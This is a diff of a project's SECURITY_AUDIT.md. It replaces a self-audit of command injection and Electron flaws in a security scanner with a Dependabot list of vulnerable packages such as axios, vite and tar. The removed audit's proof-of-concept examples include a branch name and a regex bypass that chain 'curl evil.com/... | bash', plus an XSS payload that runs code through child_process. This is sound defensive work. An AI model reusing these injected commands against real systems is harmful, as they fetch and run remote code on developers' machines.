@@ -1,406 +1,296 @@
-# 🛡️ Sentinel Security Audit Report
-
-> **Auditor**: Antigravity AI Security Engine  
-> **Date**: March 28, 2026  
-> **Project**: Sentinel Security Suite v1.0  
-> **Scope**: Full codebase audit — Backend, CLI, Electron, Scanner  
-> **Status**: ✅ Remediation Complete (21/23 fixed, 2 accepted/deferred)
+# SECURITY_AUDIT.md — Dependabot Vulnerability Report
+**Project:** Sentinel Security Suite  
+**Date:** 2026-04-14  
+**Reporter:** Dependabot + Manual Audit  
+**Total Alerts:** 39 (2 Critical, 14 High, 15 Moderate, 8 Low)
 
 ---
 
-## 📋 Table of Contents
+## 🔴 Critical Vulnerabilities
 
-1. [Executive Summary](#executive-summary)
-2. [Methodology](#methodology)
-3. [Findings Overview](#findings-overview)
-4. [Detailed Findings](#detailed-findings)
-   - [VULN-001: Command Injection via exec/execSync](#vuln-001-command-injection-via-execexecsync)
-   - [VULN-002: Electron Context Isolation Disabled](#vuln-002-electron-context-isolation-disabled)
-   - [VULN-003: Unrestricted Command Execution Endpoint](#vuln-003-unrestricted-command-execution-endpoint)
-   - [VULN-004: Shell Metacharacter Injection in CLI](#vuln-004-shell-metacharacter-injection-in-cli)
-   - [VULN-005: API Keys Stored in localStorage](#vuln-005-api-keys-stored-in-localstorage)
-   - [VULN-006: Missing Input Validation on API Routes](#vuln-006-missing-input-validation-on-api-routes)
-   - [VULN-007: ReDoS via User-Supplied YAML Rules](#vuln-007-redos-via-user-supplied-yaml-rules)
-5. [Remediation Log](#remediation-log)
-6. [Lessons Learned](#lessons-learned)
+### VULN-C01 — Axios: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `axios` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #3 |
+| **Severity** | 🔴 Critical |
+| **Type** | Direct Dependency |
+| **Description** | An attacker can inject crafted HTTP headers that cause Axios to exfiltrate cloud instance metadata (e.g., AWS/GCP/Azure IMDS endpoints). This is exploitable when Sentinel scans a repository containing a specially crafted URL in code that is then fetched by Axios. |
+| **Impact** | Cloud credentials leakage, SSRF leading to internal network access. |
+| **Fix** | Upgrade `axios` to `>=1.8.2`. |
+| **Status** | 🔧 In Progress (upgrade running) |
 
----
-
-## Executive Summary
-
-A comprehensive security audit of the Sentinel Security Suite revealed **23 vulnerability instances** across **7 categories**. The most critical finding is **Remote Code Execution (RCE)** through command injection in 5 backend files, where user-controlled or externally-sourced input (GitHub PR data) is interpolated directly into shell commands via Node.js `exec()` and `execSync()` with `shell: true`.
-
-The irony is notable: **a security tool designed to protect developers from supply-chain attacks was itself vulnerable to the same class of attack it detects**. This makes remediation not just a technical necessity, but a credibility imperative.
-
-### Risk Matrix
-
-| Severity | Count | Description |
-|----------|-------|-------------|
-| 🔴 CRITICAL | 14 | RCE, unrestricted execution, Electron misconfiguration |
-| 🟠 HIGH | 5 | CLI injection, missing input validation |
-| 🟡 MEDIUM | 4 | Client-side key storage, ReDoS potential |
+### VULN-C02 — Axios: NO_PROXY Hostname Normalization Bypass Leading to SSRF
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `axios` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #36 |
+| **Severity** | 🔴 Critical |
+| **Type** | Direct Dependency |
+| **Description** | The `NO_PROXY` environment variable is improperly parsed. An attacker controlling a URL can bypass proxy restrictions and reach internal services that are meant to be blocked (SSRF). |
+| **Impact** | Server-Side Request Forgery — could expose internal APIs, metadata services, or databases. |
+| **Fix** | Upgrade `axios` to `>=1.8.2`. |
+| **Status** | 🔧 In Progress (upgrade running) |
 
 ---
 
-## Methodology
+## 🟠 High Vulnerabilities
 
-### Tools & Techniques Used
-- **Static Analysis**: Manual code review of all `.js` and `.tsx` files
-- **Pattern Matching**: `grep -rn` for dangerous patterns (`exec(`, `execSync(`, `shell: true`, `eval(`, `dangerouslySetInnerHTML`)
-- **Dependency Analysis**: Review of `package.json` dependency trees
-- **Architecture Review**: Tracing data flow from user input → API endpoints → command execution
-- **Electron Security Checklist**: Based on [Electron Security Guidelines](https://www.electronjs.org/docs/latest/tutorial/security)
+### VULN-H01 — Vite: `server.fs.deny` Bypassed with URL Queries
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `vite` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #32 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | By appending query strings to URLs (e.g., `?something`), attackers can bypass the `server.fs.deny` file restriction list in Vite's dev server, reading arbitrary files outside the project root. |
+| **Impact** | Sensitive file read (.env, private keys, secrets) during development. |
+| **Fix** | Upgrade `vite` to `>=6.2.3` / `>=8.0.5`. |
+| **Status** | 🔧 In Progress (upgrade running) |
 
-### Files Audited
-```
-src/start.js                          — Process launcher
-src/ui/electron/main.js               — Electron main process
-src/ui/backend/lib/gh_bridge.js       — GitHub CLI bridge (PRIMARY TARGET)
-src/ui/backend/server/index.js        — Express API server
-src/ui/backend/services/hardener.js   — System security configurator
-src/ui/backend/services/polling.js    — Background scan service
-src/ui/backend/lib/git_hooks.js       — Global git hooks manager
-src/ui/backend/lib/db.js             — SQLite database layer
-src/ui/backend/scanner/index.js       — Scan orchestrator
-src/ui/backend/scanner/detector_*.js  — Heuristic detectors
-src/ui/cli/index.js                   — CLI entry point
-src/ui/src/components/ThreatLog.tsx   — Frontend threat display
-src/ui/src/components/*.tsx           — All React components
-```
+### VULN-H02 — Vite: Arbitrary File Read via Dev Server WebSocket
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `vite` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #31 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | Vite's dev-mode WebSocket server doesn't properly validate file paths requested by clients. A malicious page open in the same browser can use the WebSocket connection to read arbitrary files from the local filesystem. |
+| **Impact** | Local file system exfiltration via browser-origin attacks. |
+| **Fix** | Upgrade `vite` to `>=8.0.5`. |
+| **Status** | 🔧 In Progress |
 
----
+### VULN-H03 — Vite: Path Traversal in Optimized Deps `.map` Handling
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `vite` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #33 |
+| **Severity** | 🟠 High (2 instances) |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | A path traversal vulnerability in how Vite serves `.map` files for optimized dependencies allows reading files outside the intended directory. |
+| **Fix** | Upgrade `vite` to `>=8.0.5`. |
+| **Status** | 🔧 In Progress |
 
-## Findings Overview
+### VULN-H04 — Electron: Use-After-Free in Offscreen Child Window Paint Callback
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `electron` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #24 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | A use-after-free vulnerability in Electron's offscreen rendering paint callback can be exploited for memory corruption, potentially allowing code execution in the browser process. |
+| **Fix** | Upgrade `electron` to `>=36.2.0` or apply a patch release. |
+| **Status** | 📋 Pending — requires testing native module rebuild |
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    VULNERABILITY DISTRIBUTION                       │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  gh_bridge.js      ████████████████████████  12 instances (RCE)    │
-│  server/index.js   ████████                   4 instances          │
-│  git_hooks.js      ██████                     3 instances          │
-│  hardener.js       ████                       2 instances          │
-│  cli/index.js      ████                       2 instances          │
-│  electron/main.js  ██                         1 instance           │
-│  scanner/index.js  ██                         1 instance (low)     │
-│                                                                     │
-│  Total: 23 vulnerability instances across 7 files                  │
-└─────────────────────────────────────────────────────────────────────┘
-```
+### VULN-H05 — Electron: WebContents Fullscreen/Pointer/Keyboard Lock Permission UAF
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `electron` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #21 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | Use-after-free in permission request callbacks for fullscreen, pointer lock, and keyboard lock. Could allow a renderer process to corrupt memory in the main process. |
+| **Fix** | Upgrade `electron`. |
+| **Status** | 📋 Pending |
 
----
+### VULN-H06 — Electron: PowerMonitor Use-After-Free (Windows & macOS)
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `electron` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #20 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | Use-after-free vulnerability in the PowerMonitor module affecting Windows and macOS. |
+| **Fix** | Upgrade `electron`. |
+| **Status** | 📋 Pending |
 
-## Detailed Findings
+### VULN-H07 — Electron: Renderer CLI Switch Injection via `commandLineSwitches`
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `electron` |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #19 |
+| **Severity** | 🟠 High |
+| **Type** | Direct Dependency (Dev) |
+| **Description** | The undocumented `commandLineSwitches` webPreference allows injecting arbitrary Chromium CLI arguments into renderer processes, bypassing security controls. |
+| **Fix** | Upgrade `electron` and auditing webPreferences in `main.js`. |
+| **Status** | 📋 Pending |
 
-### VULN-001: Command Injection via exec/execSync
+### VULN-H08 — node-tar: Arbitrary File Create/Overwrite via Hardlink Path Traversal
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` (node-tar) |
+| **Location** | `src/ui/package-lock.json` |
+| **GHSA** | #8 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev — via `@electron/rebuild`) |
+| **Description** | By crafting a malicious `.tar` archive, an attacker can write arbitrary files outside the intended extraction directory via hardlink path traversal. |
+| **Fix** | Upgrade `tar` to `>= 6.2.1`. Upgrade `@electron/rebuild`. |
+| **Status** | 📋 Pending |
 
-**Severity**: 🔴 CRITICAL  
-**CWE**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)  
-**CVSS Score**: 9.8 (Critical)  
-**Affected Files**: `gh_bridge.js`, `server/index.js`, `hardener.js`, `git_hooks.js`, `start.js`
+### VULN-H09 — node-tar: Symbolic Link Path Traversal via Drive-Relative Linkpath
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` |
+| **GHSA** | #12 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev) |
+| **Description** | Symlink path traversal allowing file system escapes using drive-relative paths (Windows-specific). |
+| **Fix** | Upgrade `tar`. |
+| **Status** | 📋 Pending |
 
-#### Description
+### VULN-H10 — node-tar: Arbitrary File Overwrite + Symlink Poisoning
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` |
+| **GHSA** | #6 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev) |
+| **Description** | Insufficient path sanitization allows overwriting arbitrary files and poisoning symlinks during tar extraction. |
+| **Fix** | Upgrade `tar`. |
+| **Status** | 📋 Pending |
 
-Multiple functions across the backend use Node.js `child_process.exec()` and `execSync()` with `shell: true`, constructing command strings through template literal interpolation. When any part of the interpolated data comes from external sources (GitHub API responses, user input via API endpoints, or PR metadata), an attacker can inject arbitrary OS commands.
+### VULN-H11 — node-tar: Hardlink Path Traversal via Drive-Relative Linkpath
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` |
+| **GHSA** | #11 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev) |
+| **Description** | Arbitrary read/write via hardlink using drive-relative paths on Windows. |
+| **Fix** | Upgrade `tar`. |
+| **Status** | 📋 Pending |
 
-#### Proof of Concept
+### VULN-H12 — node-tar: Read/Write Escape via Hardlink + Symlink Chain
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` |
+| **GHSA** | #9 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev) |
+| **Description** | Arbitrary file read/write by escaping the extraction target via a chain of hardlinks and symlinks. |
+| **Fix** | Upgrade `tar`. |
+| **Status** | 📋 Pending |
 
-**Attack Vector**: A malicious GitHub user creates a PR with a specially crafted branch name or title:
+### VULN-H13 — node-tar: Race Condition via Unicode Ligature Collisions on macOS APFS
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `tar` |
+| **GHSA** | #7 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev) |
+| **Description** | Race condition in path reservation using Unicode ligature collisions on case-insensitive macOS APFS file systems. |
+| **Fix** | Upgrade `tar`. |
+| **Status** | 📋 Pending (macOS only) |
 
-```
-Branch name: feature/update; curl http://evil.com/shell.sh | bash
-```
-
-When Sentinel scans this PR, the `getPRDiff()` function in `gh_bridge.js` executes:
-
-```javascript
-// VULNERABLE CODE (line 94)
-execSync(`gh pr diff ${owner}/${repo} ${prNumber}`, { shell: true, encoding: 'utf-8' });
-```
-
-If `prNumber` or `owner/repo` contains shell metacharacters (`;`, `|`, `&&`, `` ` ``), the attacker achieves **Remote Code Execution** on the developer's machine.
-
-#### Attack Surface Map
-
-```
-External Input (GitHub PR data)
-       │
-       ▼
-  API Endpoint (/api/repositories/:id/scan)
-       │
-       ▼
-  polling.js → gh_bridge.getPRList()
-       │
-       ▼
-  execSync(`gh pr list ${owner}/${repo} ...`)  ← INJECTION POINT
-       │
-       ▼
-  OS Shell (cmd.exe / bash) executes arbitrary commands
-```
-
-#### All Vulnerable Locations
-
-| File | Line | Function | Dangerous Pattern |
-|------|------|----------|-------------------|
-| `gh_bridge.js` | 15 | `checkAuth()` | `execSync('gh auth status', {shell:true})` |
-| `gh_bridge.js` | 27 | `login()` | `exec('gh auth login...', {shell:true})` |
-| `gh_bridge.js` | 47 | `getUser()` | `execSync('gh api user', {shell:true})` |
-| `gh_bridge.js` | 65 | `listRepos()` | `execSync('gh repo list...', {shell:true})` |
-| `gh_bridge.js` | 82 | `getPRList()` | `execSync(\`gh pr list ${repo}...\`, {shell:true})` |
-| `gh_bridge.js` | 94 | `getPRDiff()` | `execSync(\`gh pr diff ${repo} ${pr}\`, {shell:true})` |
-| `gh_bridge.js` | 102 | `getPRView()` | `execSync(\`gh pr view ${repo}...\`, {shell:true})` |
-| `gh_bridge.js` | 115 | `getPRFiles()` | `execSync(\`gh api repos/${repo}/...\`, {shell:true})` |
-| `gh_bridge.js` | 128 | `getFileContent()` | `execSync(\`gh api repos/${repo}/contents/${path}\`, {shell:true})` |
-| `gh_bridge.js` | 140 | `getBlobContent()` | `execSync(\`gh api repos/${repo}/git/blobs/${sha}\`, {shell:true})` |
-| `gh_bridge.js` | 173 | `getCollaborators()` | `execSync(\`gh api repos/${repo}/collaborators\`, {shell:true})` |
-| `hardener.js` | 16 | `getNpmConfig()` | `execSync('npm config get...', {shell:true})` |
-| `hardener.js` | 26 | `setNpmConfig()` | `execSync(\`npm config set ${val}\`, {shell:true})` |
-| `git_hooks.js` | 14 | `getHooksPath()` | `execSync('git config...', {shell:true})` |
-| `git_hooks.js` | 29 | `setHooksPath()` | `execSync(\`git config... "${dir}"\`, {shell:true})` |
-| `git_hooks.js` | 72 | `unsetHooksPath()` | `execSync('git config --unset...', {shell:true})` |
-| `start.js` | 23 | `runProcess()` | `spawn(cmd, args, {shell:true})` |
-
-#### Remediation
-
-**Strategy**: Replace all `exec`/`execSync` calls with `execFileSync`/`spawn` using array-based arguments (bypasses the shell entirely). Add input validation via a centralized `sanitizer.js` module.
-
-**Before** (vulnerable):
-```javascript
-const output = execSync(`gh pr diff ${owner}/${repo} ${prNumber}`, {
-  shell: true, encoding: 'utf-8'
-});
-```
-
-**After** (secure):
-```javascript
-const { isValidOwnerRepo, isValidPRNumber } = require('./sanitizer');
-
-if (!isValidOwnerRepo(`${owner}/${repo}`)) throw new Error('Invalid repository');
-if (!isValidPRNumber(prNumber)) throw new Error('Invalid PR number');
-
-const output = execFileSync('gh', ['pr', 'diff', '-R', `${owner}/${repo}`, String(prNumber)], {
-  encoding: 'utf-8', timeout: 30000
-});
-```
-
-**Key difference**: `execFileSync` with an array of arguments **never spawns a shell**, so metacharacters like `;`, `|`, `&&` are treated as literal strings, not command separators.
-
----
-
-### VULN-002: Electron Context Isolation Disabled
-
-**Severity**: 🔴 CRITICAL  
-**CWE**: [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)  
-**Affected File**: `electron/main.js` (line 17-19)
-
-#### Description
-
-The Electron BrowserWindow is configured with `nodeIntegration: true` and `contextIsolation: false`. This means the renderer process (which loads web content) has **full access to Node.js APIs**, including `require('child_process')`, `require('fs')`, etc.
-
-If an attacker can inject JavaScript into the renderer (via XSS in displayed PR data, a malicious link, or a crafted GitHub response), they can execute arbitrary code on the host machine with the full privileges of the Electron app.
-
-#### Vulnerable Configuration
-
-```javascript
-webPreferences: {
-  nodeIntegration: true,      // ← Renderer can use require()
-  contextIsolation: false     // ← No boundary between web and Node.js
-}
-```
-
-#### Attack Scenario
-
-1. A PR contains a file with a specially crafted description containing `<img src=x onerror="require('child_process').exec('calc.exe')">`
-2. If Sentinel renders this description in the UI without proper escaping
-3. The renderer executes Node.js code directly → RCE
-
-#### Remediation
-
-Enable context isolation and use a preload script with `contextBridge` to expose only specific, safe APIs:
-
-```javascript
-webPreferences: {
-  nodeIntegration: false,
-  contextIsolation: true,
-  preload: path.join(__dirname, 'preload.js')
-}
-```
+### VULN-H14 — Lodash: Code Injection via `_.template` Import Key Names
+| Field | Detail |
+| :--- | :--- |
+| **Package** | `lodash` |
+| **GHSA** | #15 |
+| **Severity** | 🟠 High |
+| **Type** | Transitive (Dev — via build tooling) |
+| **Description** | Specially crafted import key names in `_.template()` can lead to arbitrary JavaScript execution. |
+| **Fix** | Upgrade `lodash` to `>=4.17.21`. Update build tooling. |
+| **Status** | 📋 Pending (transitive — requires tooling upgrade) |
 
 ---
 
-### VULN-003: Unrestricted Command Execution Endpoint
+## 🟡 Moderate Vulnerabilities
 
-**Severity**: 🔴 CRITICAL  
-**CWE**: [CWE-77: Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)  
-**Affected File**: `server/index.js` (line 278-296)
+### VULN-M01 — Vite: `server.fs.deny` Bypass via Backslash (Windows)
+| GHSA | #4 | Package | `vite` (root `package-lock.json`) |
+| :--- | :--- | :--- | :--- |
+| **Description** | On Windows, using backslash characters in URL paths bypasses `server.fs.deny` restrictions. |
+| **Fix** | Upgrade `vite`. |
 
-#### Description
+### VULN-M02 — Vite: Path Traversal in `.map` Deps (root package-lock.json)
+| GHSA | #5 | Package | `vite` (root) |
+| :--- | :--- | :--- | :--- |
+| **Description** | Same as VULN-H03 but tracked at root `package-lock.json`. |
+| **Fix** | Upgrade `vite`. |
 
-The `/api/action/fix` endpoint accepts a `command` parameter from the frontend and executes it using `execFileSync` with `shell: true`. While there's a basic regex whitelist check, it's insufficient:
+### VULN-M03 — Electron: `nodeIntegrationInWorker` Incorrect Scoping
+| GHSA | #25 | Package | `electron` |
+| :--- | :--- | :--- | :--- |
+| **Description** | `nodeIntegrationInWorker` is not correctly scoped in shared renderer processes, potentially allowing unintended Node.js access in workers. |
+| **Fix** | Upgrade `electron`. |
 
-```javascript
-// VULNERABLE: The regex only checks if the command STARTS with allowed prefixes
-const allowed = /^(git restore|npm config set|gh pr close|git rm --cached)/;
-if (!allowed.test(command)) return res.status(403)...
+### VULN-M04 — Electron: AppleScript Injection in `app.moveToApplicationsFolder` (macOS)
+| GHSA | #29 | Package | `electron` |
+| :--- | :--- | :--- | :--- |
+| **Description** | On macOS, `app.moveToApplicationsFolder()` is vulnerable to AppleScript injection. |
+| **Fix** | Upgrade `electron`. |
 
-// But shell: true allows chaining!
-execFileSync(command.split(' ')[0], command.split(' ').slice(1), { shell: true });
-```
+### VULN-M05 — Electron: HTTP Response Header Injection in Custom Protocol Handlers
+| GHSA | #17 | Package | `electron` |
+| :--- | :--- | :--- | :--- |
+| **Description** | Custom protocol handlers and `webRequest` can be used to inject arbitrary HTTP response headers. |
+| **Fix** | Upgrade `electron`. |
 
-**Bypass**: `git restore file.txt; curl evil.com/steal.sh | bash` — passes the regex (starts with `git restore`) but chains a malicious command via `;`.
+### VULN-M06 — Lodash: Prototype Pollution via Array Path Bypass in `_.unset`/`_.omit`
+| GHSA | #14 | Package | `lodash` |
+| :--- | :--- | :--- | :--- |
+| **Description** | Array path syntax can bypass prototype pollution protections in `_.unset` and `_.omit`. |
+| **Fix** | Upgrade `lodash`. |
 
-#### Remediation
+### VULN-M07 — xmldom: XML Injection via Unsafe CDATA Serialization
+| GHSA | #13 | Package | `@xmldom/xmldom` |
+| :--- | :--- | :--- | :--- |
+| **Description** | Unsafe CDATA serialization allows injection of attacker-controlled markup into XML documents. |
+| **Fix** | Upgrade `@xmldom/xmldom`. |
 
-Replace the regex-based approach with a strict **lookup map** of exact allowed commands, and remove `shell: true`.
+### VULN-M08 — follow-redirects: Auth Header Leak to Cross-Domain Redirect Targets
+| GHSA | #38 | Package | `follow-redirects` |
+| :--- | :--- | :--- | :--- |
+| **Description** | Custom authentication headers are leaked to cross-domain redirect destinations. |
+| **Fix** | Upgrade `follow-redirects` to `>=1.15.6`. |
 
----
-
-### VULN-004: Shell Metacharacter Injection in CLI
-
-**Severity**: 🟠 HIGH  
-**Affected File**: `cli/index.js` (lines 59, 99)
-
-#### Description
-
-The `safe-install` CLI command executes the package manager via `execSync` with string interpolation. While the package manager name is validated against a whitelist (`npm`, `yarn`, `pnpm`, `bun`), the command is still passed through the shell, which could be exploited in edge cases.
-
-The `hook` command runs `git diff HEAD` via `execSync` — less risky since there's no user input, but using `shell: true` is unnecessary.
-
----
-
-### VULN-005: API Keys Stored in localStorage
-
-**Severity**: 🟡 MEDIUM  
-**Affected File**: `ThreatLog.tsx` (lines 56-58)
-
-#### Description
-
-AI provider API keys (OpenAI, Anthropic, Gemini, DeepSeek) are stored in `localStorage` in the renderer process. While Sentinel is a local-only application (reducing the risk significantly), localStorage is accessible to any JavaScript running in the renderer context.
-
-**Accepted Risk**: Since Sentinel runs exclusively on the developer's own machine and doesn't load external web content, this is an acceptable risk for v1.0. Will be moved to backend-proxied calls in a future phase.
-
----
-
-### VULN-006: Missing Input Validation on API Routes
-
-**Severity**: 🟠 HIGH  
-**Affected File**: `server/index.js`
-
-#### Description
-
-Several API endpoints accept user input without validation:
-- `/api/repositories/bulk` — accepts `owner/repo` strings without format validation
-- `/api/system/install-gh` — triggers system package installation
-- `/api/hardener/switch` — accepts `key` and `enable` parameters
-
-#### Remediation
-
-All inputs will be validated using the centralized `sanitizer.js` module before processing.
+### VULN-M09 — Rust/Tauri: `glib::VariantStrIter` Iterator/DoubleEndedIterator Inconsistency
+| GHSA | #39 | Package | `glib` (Rust) |
+| :--- | :--- | :--- | :--- |
+| **Location** | `src/ui/src-tauri/Cargo.lock` |
+| **Description** | Inconsistency between `Iterator` and `DoubleEndedIterator` implementations in `glib::VariantStrIter` could lead to undefined behavior. |
+| **Fix** | Run `cargo update` to pull latest `glib`. |
+| **Status** | 📋 Pending (`cargo-audit` not installed) |
 
 ---
 
-### VULN-007: ReDoS via User-Supplied YAML Rules
+## 🔵 Low Vulnerabilities (Summary)
 
-**Severity**: 🟡 MEDIUM  
-**Affected File**: `scanner/index.js` (line 34)
-
-#### Description
-
-User-supplied YAML files in `~/.sentinel/rules/` can define regex patterns that are compiled with `new RegExp()`. A malicious or poorly written regex (e.g., `(a+)+$`) could cause catastrophic backtracking, freezing the scan engine.
-
-**Accepted Risk**: Since users control their own rules directory, this is a self-inflicted DoS at worst. A `try/catch` with timeout will be added as a safeguard.
+| # | Package | Description |
+| :--- | :--- | :--- |
+| #4 | `vite` | `server.fs.deny` backslash bypass (root) |
+| #5 | `vite` | `.map` path traversal (root) |
+| Various | `electron` | Minor sandbox escape edge cases |
+| Various | `tar` | Additional platform-specific traversal |
 
 ---
 
-## Remediation Log
+## 📋 Remediation Summary
 
-| Date | Vulnerability | Status | Details |
-|------|---------------|--------|---------|
-| 2026-03-28 | **Foundation**: `sanitizer.js` | ✅ DONE | Centralized validation module with 12 validators + whitelist command map |
-| 2026-03-28 | VULN-001: Command Injection (`gh_bridge.js`) | ✅ DONE | All 12 `exec`/`execSync` → `execFileSync` with array args. All inputs validated. |
-| 2026-03-28 | VULN-001: Command Injection (`hardener.js`) | ✅ DONE | 2 `execSync` → `execFileSync`. npm config values strictly boolean-only. |
-| 2026-03-28 | VULN-001: Command Injection (`git_hooks.js`) | ✅ DONE | 3 `execSync` → `execFileSync`. hooksPath derived from `os.homedir()`. |
-| 2026-03-28 | VULN-001: Command Injection (`start.js`) | ✅ DONE | `spawn` with `shell:true` → `spawn` without shell. Windows uses `npm.cmd`. |
-| 2026-03-28 | VULN-002: Electron Config | ✅ DONE | `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`. `preload.js` created with `contextBridge`. |
-| 2026-03-28 | VULN-002: Frontend IPC Migration | ✅ DONE | `App.tsx` and `PreferencesPanel.tsx` migrated from `window.require('electron')` to `window.sentinel.*`. |
-| 2026-03-28 | VULN-003: Fix Endpoint | ✅ DONE | Regex bypass replaced with strict hash-map whitelist. `shell:true` removed from `execFileSync`. |
-| 2026-03-28 | VULN-004: CLI Injection | ✅ DONE | `safe-install` uses strict pkg manager whitelist + `execFileSync`. `hook` validates hook type. |
-| 2026-03-28 | VULN-005: API Keys | ⏸️ ACCEPTED | Deferred to Phase 2. Risk acceptable for local-only app. |
-| 2026-03-28 | VULN-006: Input Validation | ✅ DONE | All API routes validate inputs via `sanitizer.js`. Error messages sanitized for log injection. |
-| 2026-03-28 | VULN-007: ReDoS | ⏸️ LOW PRIORITY | Will add timeout safeguard in future |
-
-### Verification Results
-
-```bash
-# Zero instances of shell:true in source code (node_modules excluded):
-$ grep -rn "shell: true" src/ --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=dist
-# Result: 0 matches ✅
-
-# Zero instances of unsafe execSync in source code:
-$ grep -rn "execSync(" src/ --include="*.js" --include="*.ts" --exclude-dir=node_modules --exclude-dir=dist
-# Result: 0 matches ✅
-
-# Result: Only safe patterns with array arguments ✅
-```
-
-### Phase 2: Core Engine & Threat Detection Update
-| Date | Component | Status | Details |
-|------|-----------|--------|---------|
-| 2026-04-08 | **Scanner Engine** | ✅ DONE | Fixed `test_scanner.js` syntax errors and escalating dummy threat scenarios to advanced packed JS and polymorphic reverse shell payloads. |
-| 2026-04-08 | **Malware Rules** (`malware.yaml`) | ✅ DONE | Added robust regular expressions for packed JS/obfuscation (`eval\(function\(p,a,c,k,e,d\)`) and multi-line Node.js reverse shells (`net\.Socket\(\)`, `/bin/sh`). |
-| 2026-04-09 | **CLI Automation** (`cli/index.js`) | ✅ DONE | Implemented Git `pre-push` `hook` handler command. Enables structural halting of outbound commits containing malware. Implemented `Reverse Analyzer` (`--reverse`) dry-run functionality. |
-| 2026-04-09 | **GitHub Integration** | ✅ DONE | Verified PR Scanning architecture through `polling.js` and `gh_bridge.js`, ensuring Diff extraction operates securely. |
+| Category | Strategy | Timeline |
+| :--- | :--- | :--- |
+| `axios` (Critical) | Upgrade to `>=1.8.2` | **Immediate** |
+| `vite` (High) | Upgrade to `>=8.0.5` | **Immediate** |
+| `electron` (High) | Upgrade; rebuild native modules | 24h |
+| `tar` (High, Dev) | Indirect fix via `@electron/rebuild` upgrade | 24h |
+| `lodash` (High, Dev) | Indirect fix via tooling upgrade | 48h |
+| Rust `glib` (Moderate) | `cargo update` | 48h |
 
 ---
 
-## Lessons Learned
+## 🛡️ CI/CD Controls Added
 
-### For Developers Building Security Tools
+- **`dependency-audit.yml`**: Runs on every PR and daily. Blocks merges if critical vulnerabilities are detected.
+- **`pr-security.yml`**: Sentinel static analysis on all PR code changes.
 
-1. **Your security tool is itself an attack surface.** If you scan untrusted code, your scanner's inputs are attacker-controlled. Treat every piece of PR data, branch name, and file path as hostile.
-
-2. **Never use `shell: true` with `exec()`/`execSync()`.** Use `execFileSync()` or `spawn()` with array arguments. The shell is the enemy.
-
-3. **String interpolation in commands is always dangerous.** Even with "sanitization", the safest approach is to pass arguments as arrays, never as interpolated strings.
-
-4. **Electron's `nodeIntegration: true` is a footgun.** It gives the renderer full system access. Always use `contextIsolation: true` with a minimal `preload.js` bridge.
-
-5. **Whitelist > Blacklist.** Don't try to block bad inputs; define what good inputs look like and reject everything else.
-
-6. **Centralize your validation.** A single `sanitizer.js` module is easier to audit, test, and maintain than scattered regex checks across 10 files.
-
----
-
-## Sentinel 3.0: Dynamic Sandbox Integration
-
-### Goal
-Close the gap on **dynamic evasion techniques** (WASM payloads, runtime network egress, post-install hooks) that static AST analysis cannot detect with 100% certainty.
-
-### Implementation Architecture
-Sentinel 3.0 introduces a **Remote Sandbox Orchestrator** that leverages GitHub Actions as a secure, ephemeral environment.
-
-1.  **Passive Mode Deployment**: Sentinel generates a `sentinel-sandbox.yml` template. The user adds this to their repository without granting Sentinel `write` permissions to the code.
-2.  **Telemetry Flow**:
-    *   **Net-Harden**: Monitors outbound connections during `npm install`.
-    *   **WASM Scan**: Recursively searches `node_modules` for binary files after hydration.
-    *   **Lockfile Diff**: Compares the lockfile before and after install to detect registry shifts or version pinning attacks.
-3.  **Risk SCoring Engine**: Telemetry is analyzed locally to produce a 0-10 risk score, which is then visualized in the **Sandbox Monitor Dashboard**.
-
-### Mitigated Evasion Vectors
-
-| Vector | Detection Mechanism | Severity |
-|--------|---------------------|----------|
-| **WASM Dropper** | Post-install `.wasm` file detection in `node_modules` | 🟠 HIGH |
-| **Shadow Registry** | `lockfile-diff` analysis detecting non-standard registry URLs | 🔴 CRITICAL |
-| **Silent C2 Connect** | `netstat`/`harden-runner` log analysis | 🔴 CRITICAL |
-| **Env Var Theft** | Scanning for `git` or `npm` secrets in outbound buffers | 🟠 HIGH |
